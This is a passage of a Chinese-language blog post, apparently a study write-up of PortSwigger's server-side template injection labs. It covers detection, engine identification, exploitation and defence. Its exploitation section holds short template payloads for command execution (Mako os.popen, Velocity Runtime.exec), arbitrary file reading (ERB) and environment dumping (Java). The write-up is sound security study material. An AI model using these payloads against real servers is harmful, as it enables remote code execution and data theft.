@@ -1,0 +1,1244 @@
+<!--
+	作者：Sariay
+	时间：2018-08-26
+	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
+-->
+<!DOCTYPE html>
+<html class="html-loading">
+		
+
+<head>
+	<meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
+  <title>
+    
+      PortSwigger靶场-Server-Side Template Injection | Archeri&#39;s Blog
+    
+  </title>
+  <meta name="author" content="Archeri Shade">
+  <meta name="keywords" content="" />
+  <meta name="description" content="" />
+	<!-- favicon -->
+  <link rel="shortcut icon" href="/img/favicon.ico">
+
+  <!-- css -->
+  
+<link rel="stylesheet" href="/css/Annie.css">
+
+  
+  <!-- jquery -->
+	
+<script src="/plugin/jquery/jquery.min.js"></script>
+
+
+<script>
+    const CONFIG_BGIMAGE = {
+      mode: 'random_you',
+      normalSrc: '/img/header-bg.jpg',
+      randomYouMax: 7,
+      randomYouSrc: '/img/Random-img/',
+	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
+	  preloaderEnable: true
+    }
+	
+    const CONFIG_LEACLOUD_COUNT = {
+      enable: false,
+	  appId: 'AU8...',
+	  appKey: '4cU...',
+	  serverURLs: 'http' || ' '
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+	<body>
+		<!-- Preloader -->
+
+	<div id="preloader">
+		<div class="pre-container">
+			
+				<div class="spinner">
+					<div class="double-bounce1"></div>
+					<div class="double-bounce2"></div>
+				</div>
+						
+		</div>
+	</div>
+
+
+<!-- header -->
+<header class="fixbackground bg-pan-br">
+	<div class="mask">
+		<!-- motto -->
+		<div class="h-body">	
+			
+				<div class="motto text-shadow-pop-left">
+					<p class="content" id="motto-content">获取中...</p>
+					<p>-<p>
+					<p class="author" id="motto-author">Just a minute...</p>
+				</div>
+			
+		</div>
+		
+		<!-- others: such as time... -->			
+		<div class="h-footer">
+			<a href="javascript:;" id="read-more" class="scroll-down">
+				<span class="icon-anchor1 animation-scroll-down"></span>
+			</a>
+		</div>
+	</div>
+</header>
+
+<div id="navigation-hide">
+	<!-- Progress bar -->
+	<div id="progress-bar"></div>
+
+	<!-- Progress percent -->
+	<div id="progress-percentage"><span>0.0%</span></div>
+
+	<div class="toc-switch"><span class="switch-button">目录</span></div>
+
+	<!-- Page title -->
+	<p>
+		
+			「PortSwigger靶场-Server-Side Template Injection」
+		
+	</p>
+
+	
+	
+
+	<!-- Nav trigger for navigation-H-->
+	<a class="nav-trigger"><span></span></a>
+</div>
+
+<!-- Navigation in div(id="navigation-H") -->
+<nav class="nav-container" id="cd-nav">
+	<div class="nav-header">
+		<span class="logo"> 
+			<img src="/img/logo.png">
+		</span>
+		<a href="javascript:;" class="nav-close"></a>
+	</div>
+	
+	<div class="nav-body">
+		<ul id="global-nav">
+	
+		<li class="menu-home">
+			<a href="/" class="menu-item-home" target="_blank">主页</a>
+		</li>
+		
+	
+		<li class="menu-archive">
+			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
+		</li>
+		
+	
+		<li class="menu-categories">
+			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
+		</li>
+		
+	
+		<li class="menu-tags">
+			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
+		</li>
+		
+	
+		<li class="menu-about">
+			<a href="/about" class="menu-item-about" target="_blank">关于</a>
+		</li>
+		
+	
+		<li class="menu-gallery">
+			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
+		</li>
+		
+	
+
+	
+		<li class="menu-search">
+			<a href="javascript:;" class="popup-trigger">搜索</a>
+		</li>
+	
+</ul>
+	</div>
+	
+	<div class="nav-footer">
+		<ul id="global-social">
+	
+		<li>
+			<a href="https://github.com/ArcheriShade" target="_blank">
+				<span class="icon-github"></span>
+			</a>
+		</li>
+			
+</ul>
+
+	</div>
+</nav>
+			
+		<!--main-->
+		<main>
+			<!--
+	时间：2018-11-17
+	描述：
+		插件名称：katelog.min.js
+		插件作者：KELEN
+		插件来源: https://github.com/KELEN/katelog
+-->
+
+	
+		<div class="layout-toc">
+			<div id="layout-toc">
+				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
+			</div>
+		</div>
+
+		
+<script src="/plugin/toc/katelog.min.js"></script>
+
+
+		
+	 
+
+<div class="layout-post">
+	<div id="layout-post">
+		<div class="article-title">
+			
+	<a href="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/" itemprop="url">
+		PortSwigger靶场-Server-Side Template Injection
+	</a>
+
+		</div>
+
+		<div class="article-meta">
+			<span>
+				<i class="icon-calendar1"></i>
+				
+				
+
+
+
+
+	更新于
+
+	<a href="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/" itemprop="url">
+		<time datetime="2024-09-10T11:06:23.000Z" itemprop="dateUpdated">
+	  		2024-09-10
+	  </time>
+	</a> 
+
+
+
+			</span>
+			<span>
+				
+	<i class="icon-price-tags"></i>
+	
+		<a href="/tags/Web/" class=" ">
+			Web
+		</a>
+	
+		<a href="/tags/portswigger/" class=" ">
+			portswigger
+		</a>
+	
+		<a href="/tags/SSTI/" class=" ">
+			SSTI
+		</a>
+	
+		
+			</span>
+			
+			
+
+
+
+		</div>
+
+		<div class="article-content" id="article-content">
+			<h1 id="0-总结"><a href="#0-总结" class="headerlink" title="0 总结"></a>0 总结</h1><ul>
+<li>服务端模板注入本身是个很抽象的概念，需要判断目标使用了什么具体的模板</li>
+<li>识别之后就是大量地读文档和查资料，找到可能的攻击点</li>
+<li>还要探测目标的特定环境进行攻击</li>
+<li>不太好找，可能与XSS弄混；找到了也可能不太好利用</li>
+</ul>
+<h1 id="1-简介"><a href="#1-简介" class="headerlink" title="1 简介"></a>1 简介</h1><blockquote>
+<p>2015年PortSwigger首次提出了这项技术：<a target="_blank" rel="noopener" href="https://portswigger.net/research/server-side-template-injection">Server-side template injection</a></p>
+</blockquote>
+<p>SSTI：攻击者能够使用本地模板语法将恶意有效负载注入模板，然后在服务器端执行。危害通常是实现在服务端RCE、获取服务端敏感数据和任意文件读取</p>
+<p>模板引擎：通过将固定模板与易失性数据相结合来生成网页。当<strong>用户输入直接定向到模板中</strong>，而不是作为数据传递时，可能会发生服务器端模板注入攻击。这允许攻击者<strong>注入任意模板指令来操纵模板引擎</strong>，通常使他们能够完全控制服务器</p>
+<h1 id="2-如何产生"><a href="#2-如何产生" class="headerlink" title="2 如何产生"></a>2 如何产生</h1><p>当<strong>用户输入直接定向到模板中</strong>，而不是作为数据传递时，可能会发生服务器端模板注入攻击</p>
+<p>仅提供占位符以渲染动态内容的<strong>静态模板</strong>通常不易受到服务器端模板注入的攻击。一个例子，用名字问候每个用户的电子邮件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用户输入仅作为模板字符串的参数</span></span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Dear &#123;first_name&#125;,&quot;</span>, <span class="keyword">array</span>(<span class="string">&quot;first_name&quot;</span> =&gt; <span class="variable">$user</span>.first_name));</span><br></pre></td></tr></table></figure>
+
+<p>这不易收到SSTI攻击，因为用户名只是作为数据传递到模板中</p>
+<p>然而，由于模板只是<strong>字符串</strong>，web开发人员有时会在渲染之前直接将用户输入与模板连接。例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 用户输入直接作为模板字符串的一部分</span></span><br><span class="line"><span class="variable">$output</span> = <span class="variable">$twig</span>-&gt;<span class="title function_ invoke__">render</span>(<span class="string">&quot;Dear &quot;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>这种就存在SSTI漏洞。&#x3D;&#x3D;类似于SQL注入&#x3D;&#x3D;</p>
+<p>出现的成因：</p>
+<ul>
+<li>开发者不熟，误用</li>
+<li>一些网站故意允许某些特权用户（如内容编辑器）设计编辑或提交自定义模板</li>
+</ul>
+<h2 id="2-1-检测"><a href="#2-1-检测" class="headerlink" title="2.1 检测"></a>2.1 检测</h2><p>服务器端模板注入漏洞经常被忽视，不是因为它们很复杂，而是因为只有明确寻找它们的审计员才能真正发现它们&#x3D;&#x3D;专门地代码审计&#x3D;&#x3D;</p>
+<p>通常：尝试注入模板表达式中常用的特殊字符来fuzz模板：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910192529147.png" alt="image-20240910192529147"></p>
+<p>如果引发异常，表示注入的模板语法可能正被服务器以某种方式解释。这表明可能存在SSTI</p>
+<p><strong>Plaintext context</strong></p>
+<p>大多数模板语言允许通过直接使用HTML标签或使用模板语法自由输入内容，这些语法将在发送HTTP响应之前在后端渲染为HTML。比如在Freemarker中（一个基于Java的生成HTML页面的模板引擎）：<code>render(&#39;Hello &#39; + username)</code>。为了避免被误认为是简单的XSS攻击，可以尝试通过注入数学运算表达式的方式进行判断。例如上面的语句，可以这样传参：<code>http://vulnerable-website.com/?username=$&#123;7*7&#125;</code>，如果回显的是<code>Hello 49</code>，则说明运算表达式被服务端解析，可以作为SSTI漏洞的POC</p>
+<p><strong>Code context</strong></p>
+<p>在其他情况下，漏洞是通过将用户输入放置在模板表达式中而暴露的，正如我们之前在电子邮件示例中看到的那样。这可能采取将用户可控变量名放置在参数内的形式，例如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">greeting = getQueryParameter(<span class="string">&#x27;greeting&#x27;</span>)</span><br><span class="line">engine.render(<span class="string">&quot;Hello &#123;&#123;&quot;</span>+greeting+<span class="string">&quot;&#125;&#125;&quot;</span>, data)</span><br></pre></td></tr></table></figure>
+
+<p>此时的url长这样：<code>http://vulnerable-website.com/?greeting=data.username</code>，渲染之后输出<code>Hello Carlos</code></p>
+<p>由于这种情况很容易与XSS混淆，因此需要再尝试注入HTML标签来判断是否为XSS：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/image-20240910192547799.png" alt="image-20240910192547799"></p>
+<ul>
+<li>如果回显错误，则可能是发生了语法错误</li>
+<li>如果用户名与HTML标签一起显示了（<code>Hello Carlos&lt;tag&gt;</code>），则说明各部分都被模板引擎正确处理，说明存在SSTI</li>
+</ul>
+<h2 id="2-1-识别模板引擎"><a href="#2-1-识别模板引擎" class="headerlink" title="2.1 识别模板引擎"></a>2.1 识别模板引擎</h2><p>尽管有大量的模板语言，但它们中的许多都使用非常相似的语法，这些语法是专门选择的，不会与HTML字符冲突。因此，创建探测有效载荷来测试正在使用的模板引擎可能相对简单。</p>
+<p>通常输入错误的语法就足够了，因为报错结果通常会告诉你是哪个模板引擎，甚至会把版本也给出来。例如错误表达式<code>&lt;%=foobar%&gt;</code>会引起基于Ruby的ERB引擎这样的报错：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(erb):1:in `&lt;main&gt;&#x27;: undefined local variable or method `foobar&#x27; for main:Object (NameError)</span><br><span class="line">from /usr/lib/ruby/2.5.0/erb.rb:876:in `eval&#x27;</span><br><span class="line">from /usr/lib/ruby/2.5.0/erb.rb:876:in `result&#x27;</span><br><span class="line">from -e:4:in `&lt;main&gt;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>否则，您需要手动测试不同语言特定的有效载荷，并研究模板引擎如何解释它们。使用基于语法有效或无效的消除过程，您可以比想象中更快地缩小选项范围。一种常见的方法是使用来自不同模板引擎的语法注入任意数学运算。然后，您可以观察它们是否被成功评估。为了帮助完成这一过程，您可以使用类似于以下内容的决策树：</p>
+<p><img src="/2024/09/10/PortSwigger%E9%9D%B6%E5%9C%BA-Server-Side-Template-Injection/template-decision-tree.png" alt="template-decision-tree"></p>
+<p>同一负载有时会以多种模板语言返回成功的响应。例如，有效载荷<code>&#123;&#123;7*'7'&#125;&#125;</code>在Twig中返回<code>49</code>，在Jinja2中返回<code>7777777</code>。因此，重要的是不要根据一个成功的回应得出结论。</p>
+<h2 id="2-3-利用"><a href="#2-3-利用" class="headerlink" title="2.3 利用"></a>2.3 利用</h2><p>一般发现SSTI漏洞并确定所使用模板引擎之后，常规的利用步骤：</p>
+<ul>
+<li>阅读<ul>
+<li>模板语法</li>
+<li>安全文档</li>
+<li>文档利用</li>
+</ul>
+</li>
+<li>环境探测</li>
+<li>发起自定义攻击</li>
+</ul>
+<h3 id="2-3-1-阅读"><a href="#2-3-1-阅读" class="headerlink" title="2.3.1 阅读"></a>2.3.1 阅读</h3><p>除非你已经对模板引擎了如指掌，否则阅读其文档通常是第一步。虽然这可能不是最令人兴奋的消磨时间的方式，但重要的是不要低估文档的有用信息来源。</p>
+<p><strong>掌握基础模板语法</strong></p>
+<p>学习<strong>基础语法以及关键函数</strong>，优先关注一些敏感的函数，比如Python的Mako模板引擎，实现RCE很简单：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">                import os</span><br><span class="line">                x=os.popen(&#x27;id&#x27;).read()</span><br><span class="line">                %&gt;</span><br><span class="line">                $&#123;x&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>关注文档里面的安全建议</strong></p>
+<p>除了提供如何创建和使用模板的基础知识外，文档还可能提供某种“安全”部分。这个部分的名称会有所不同，但它通常会概述人们应该避免使用模板做的所有潜在危险的事情。这可能是一种宝贵的资源，甚至可以作为一种备忘单，在审计过程中应该寻找哪些行为，以及如何利用它们。</p>
+<p>即使没有专门的“安全”部分，如果特定的内置对象或函数可能构成安全风险，文档中几乎总是会有某种警告。警告可能不会提供太多细节，但至少应该将此特定内置标记为需要调查的内容。</p>
+<p>例如在<a target="_blank" rel="noopener" href="https://docs.ruby-lang.org/en/2.3.0/ERB.html">ERB的文档</a>中，就告诉你了怎样可以列出所有文件，或者读取任意文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%= Dir.entries(&#x27;/&#x27;) %&gt;</span><br><span class="line">&lt;%= File.open(&#x27;/example/arbitrary-file&#x27;).read %&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-3-2-探索"><a href="#2-3-2-探索" class="headerlink" title="2.3.2 探索"></a>2.3.2 探索</h3><p>如果没有发现模板引擎相关的信息，则需要尝试进一步探索目标环境</p>
+<p>很多模板引擎公开了某类“self”或“environment”对象，有点像命名空间，包含了模板引擎支持的所有对象、方法和属性</p>
+<p>如果存在这样的对象，可以尝试使用其生成范围内的对象列表</p>
+<p>例如在基于Java的模板语言中，有时可以使用以下注入列出环境中的所有变量：</p>
+<p><code>$&#123;T(java.lang.System).getenv()&#125;</code></p>
+<p>对于Burp Suite Pro用户，Intruder模块提供了一个内置的字典，用于暴力枚举变量名</p>
+<p>Lab 4.5</p>
+<h3 id="2-3-3-创建自定义攻击"><a href="#2-3-3-创建自定义攻击" class="headerlink" title="2.3.3 创建自定义攻击"></a>2.3.3 创建自定义攻击</h3><p>如果找不到相关信息，或者环境探测的过程中发现模板引擎是在沙箱中渲染模板的话，就要考虑自己通过代码审计，去构建一个有效的EXP</p>
+<p>比如通过构造对象链（object chain）</p>
+<p>首先第一步是确定是否有权限去访问特定对象：结合知识储备和文档中提供的信息，列出一份想要更彻底调查的对象的短名单。在研究对象的文档时，要特别注意这些对象授予哪些方法访问权限，以及它们返回哪些对象。通过深入文档，可以发现可以链接在一起的对象和方法的组合。将正确的对象和方法链接在一起，有时可以访问最初看起来遥不可及的危险功能和敏感数据。</p>
+<p>例如，在基于Java的模板引擎Velocity中，可以访问名为<code>$class</code>的<code>ClassTool</code>对象。研究文档表明，可以使用<code>$class.inspect()</code>方法和<code>$class.type</code>属性来获取对任意对象的引用。过去，这被用来在目标系统上执行shell命令，如下所示：<code>$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;bad-stuff-here&quot;)</code></p>
+<p>Lab 4.6</p>
+<p>其他时候就需要自己调查网站的行为，以识别攻击面并相应地构建自己的自定义EXP</p>
+<p>Lab 4.7</p>
+<h1 id="3-防御"><a href="#3-防御" class="headerlink" title="3 防御"></a>3 防御</h1><p>最好就是不允许用户修改或提交模板（虽然一些业务情况是需要的）</p>
+<p>最简单的方法之一是始终使用“无逻辑”（logic-less）模板引擎，如Mustache。尽可能地将逻辑与表示分离</p>
+<p>另一种是只在沙盒环境中执行用户的代码，其中潜在的危险模块和功能已被完全删除。不幸的是，沙盒化不受信任的代码本身就很困难，而且容易被绕过</p>
+<h1 id="4-Lab"><a href="#4-Lab" class="headerlink" title="4 Lab"></a>4 Lab</h1><h2 id="4-1-Basic-server-side-template-injection"><a href="#4-1-Basic-server-side-template-injection" class="headerlink" title="4.1 Basic server-side template injection"></a>4.1 Basic server-side template injection</h2><p>ERB模板构造不当导致的SSTI，目标是构造代码，删除Carlos家目录中的<code>morale.txt</code>文件</p>
+<h3 id="4-1-1-ERB的前置知识"><a href="#4-1-1-ERB的前置知识" class="headerlink" title="4.1.1 ERB的前置知识"></a>4.1.1 ERB的前置知识</h3><p>&#x3D;&#x3D;感觉就是要掌握一点ruby语言，还有基础的模板格式&#x3D;&#x3D;</p>
+<p>首先阅读<a target="_blank" rel="noopener" href="https://docs.ruby-lang.org/en/2.3.0/ERB.html">ERB的文档</a>，看看怎么执行代码</p>
+<p>最基本的语法，使用<code>&lt;%  %&gt;</code>包含变量：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">42</span></span><br><span class="line">template = <span class="variable constant_">ERB</span>.new <span class="string">&lt;&lt;-EOF</span></span><br><span class="line"><span class="string">  The value of x is: &lt;%= x %&gt;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">puts template.result(binding)</span><br></pre></td></tr></table></figure>
+
+<p>结果是输出：“The value of x is: 42”</p>
+<p>其他语法或标签：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;% Ruby code -- inline with output %&gt;</span><br><span class="line">&lt;%= Ruby expression -- replace with result %&gt;</span><br><span class="line">&lt;%# comment -- ignored -- useful in testing %&gt;</span><br><span class="line">% a line of Ruby code -- treated as &lt;% line %&gt; (optional -- see ERB.new)</span><br><span class="line">%% replaced with % if first thing on a line and % processing is used</span><br><span class="line">&lt;%% or %%&gt; -- replace with &lt;% or %&gt; respectively</span><br></pre></td></tr></table></figure>
+
+
+
+<p>字符编码：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;erb&#x27;</span></span><br><span class="line"></span><br><span class="line">template = <span class="variable constant_">ERB</span>.new <span class="string">&lt;&lt;EOF</span></span><br><span class="line"><span class="string">&lt;%#-*- coding: Big5 -*-%&gt;</span></span><br><span class="line"><span class="string">  \_\_ENCODING\_\_ is &lt;%= \_\_ENCODING\_\_ %&gt;.</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">puts template.result</span><br></pre></td></tr></table></figure>
+
+
+
+<p>一个典型的生成邮件的模板例子：</p>
+<ul>
+<li>使用了以“%”开头的单行标签</li>
+<li>使用了<code>%q&#123;...&#125;</code>迭代地引用模板</li>
+</ul>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;erb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create template.</span></span><br><span class="line">template = <span class="string">%q&#123;</span></span><br><span class="line"><span class="string">  From:  James Edward Gray II &lt;james@grayproductions.net&gt;</span></span><br><span class="line"><span class="string">  To:  &lt;%= to %&gt;</span></span><br><span class="line"><span class="string">  Subject:  Addressing Needs</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;%= to[/\w+/] %&gt;:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Just wanted to send a quick note assuring that your needs are being</span></span><br><span class="line"><span class="string">  addressed.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  I want you to know that my team will keep working on the issues,</span></span><br><span class="line"><span class="string">  especially:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  &lt;%# ignore numerous minor requests -- focus on priorities %&gt;</span></span><br><span class="line"><span class="string">  % priorities.each do |priority|</span></span><br><span class="line"><span class="string">    * &lt;%= priority %&gt;</span></span><br><span class="line"><span class="string">  % end</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  Thanks for your patience.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  James Edward Gray II</span></span><br><span class="line"><span class="string">&#125;</span>.gsub(<span class="regexp">/^  /</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="variable constant_">ERB</span>.new(template, <span class="number">0</span>, <span class="string">&quot;%&lt;&gt;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up template data.</span></span><br><span class="line">to = <span class="string">&quot;Community Spokesman &lt;spokesman@ruby_community.org&gt;&quot;</span></span><br><span class="line">priorities = [ <span class="string">&quot;Run Ruby Quiz&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Document Modules&quot;</span>,</span><br><span class="line">               <span class="string">&quot;Answer Questions on Ruby Talk&quot;</span> ]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Produce result.</span></span><br><span class="line">email = message.result</span><br><span class="line">puts email</span><br></pre></td></tr></table></figure>
+
+<p>生成的邮件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">From:  James Edward Gray II &lt;james@grayproductions.net&gt;</span><br><span class="line">To:  Community Spokesman &lt;spokesman@ruby_community.org&gt;</span><br><span class="line">Subject:  Addressing Needs</span><br><span class="line"></span><br><span class="line">Community:</span><br><span class="line"></span><br><span class="line">Just wanted to send a quick note assuring that your needs are being addressed.</span><br><span class="line"></span><br><span class="line">I want you to know that my team will keep working on the issues, especially:</span><br><span class="line"></span><br><span class="line">    * Run Ruby Quiz</span><br><span class="line">    * Document Modules</span><br><span class="line">    * Answer Questions on Ruby Talk</span><br><span class="line"></span><br><span class="line">Thanks for your patience.</span><br><span class="line"></span><br><span class="line">James Edward Gray II</span><br></pre></td></tr></table></figure>
+
+
+
+<p>一个HTML网页模板的例子：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">&quot;erb&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Build template data class.</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Product</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">initialize</span>(<span class="params"> code, name, desc, cost </span>)</span><br><span class="line">    <span class="variable">@code</span> = code</span><br><span class="line">    <span class="variable">@name</span> = name</span><br><span class="line">    <span class="variable">@desc</span> = desc</span><br><span class="line">    <span class="variable">@cost</span> = cost</span><br><span class="line"></span><br><span class="line">    <span class="variable">@features</span> = [ ]</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">add_feature</span>(<span class="params"> feature </span>)</span><br><span class="line">    <span class="variable">@features</span> &lt;&lt; feature</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># Support templating of member data.</span></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">get_binding</span></span><br><span class="line">    binding</span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">  <span class="comment"># ...</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Create template.</span></span><br><span class="line">template = <span class="string">%&#123;</span></span><br><span class="line"><span class="string">  &lt;html&gt;</span></span><br><span class="line"><span class="string">    &lt;head&gt;&lt;title&gt;Ruby Toys -- &lt;%= @name %&gt;&lt;/title&gt;&lt;/head&gt;</span></span><br><span class="line"><span class="string">    &lt;body&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      &lt;h1&gt;&lt;%= @name %&gt; (&lt;%= @code %&gt;)&lt;/h1&gt;</span></span><br><span class="line"><span class="string">      &lt;p&gt;&lt;%= @desc %&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      &lt;ul&gt;</span></span><br><span class="line"><span class="string">        &lt;% @features.each do |f| %&gt;</span></span><br><span class="line"><span class="string">          &lt;li&gt;&lt;b&gt;&lt;%= f %&gt;&lt;/b&gt;&lt;/li&gt;</span></span><br><span class="line"><span class="string">        &lt;% end %&gt;</span></span><br><span class="line"><span class="string">      &lt;/ul&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">      &lt;p&gt;</span></span><br><span class="line"><span class="string">        &lt;% if @cost &lt; 10 %&gt;</span></span><br><span class="line"><span class="string">          &lt;b&gt;Only &lt;%= @cost %&gt;!!!&lt;/b&gt;</span></span><br><span class="line"><span class="string">        &lt;% else %&gt;</span></span><br><span class="line"><span class="string">           Call for a price, today!</span></span><br><span class="line"><span class="string">        &lt;% end %&gt;</span></span><br><span class="line"><span class="string">      &lt;/p&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &lt;/body&gt;</span></span><br><span class="line"><span class="string">  &lt;/html&gt;</span></span><br><span class="line"><span class="string">&#125;</span>.gsub(<span class="regexp">/^  /</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rhtml = <span class="variable constant_">ERB</span>.new(template)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set 